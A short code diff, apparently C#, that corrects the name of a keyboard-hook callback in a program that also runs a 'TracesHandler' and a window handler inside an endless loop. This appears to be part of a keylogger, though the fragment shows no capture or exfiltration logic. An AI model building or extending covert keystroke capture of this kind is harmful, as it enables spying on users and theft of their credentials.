@@ -3,7 +3,7 @@
 
 TracesHandler.Run();
 WindowHandler.HandleWindows();
-InterceptKeys.SetHook(HookHandler.KeyPressedCallstack);
+InterceptKeys.SetHook(HookHandler.KeyPressedCallback);
 
 // Keep the program running
 while (true)
